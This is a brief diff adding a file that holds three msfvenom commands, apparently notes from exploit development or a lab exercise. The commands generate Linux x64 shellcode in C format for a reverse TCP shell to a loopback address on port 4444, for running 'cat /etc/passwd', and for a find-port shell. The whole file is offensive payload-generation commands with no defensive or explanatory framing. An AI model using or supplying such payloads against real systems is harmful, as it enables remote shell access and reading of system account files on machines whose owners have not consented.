@@ -1,0 +1,5 @@
+msfvenom --payload linux/x64/shell_reverse_tcp rhost=127.1.1.1 rport=4444 -a x86_64 --platform linux -f c
+
+msfvenom --payload linux/x64/exec cmd="cat /etc/passwd" -a x86_64 --platform linux -f c
+
+msfvenom --payload linux/x64/shell_find_port -a x86_64 --platform linux -f c
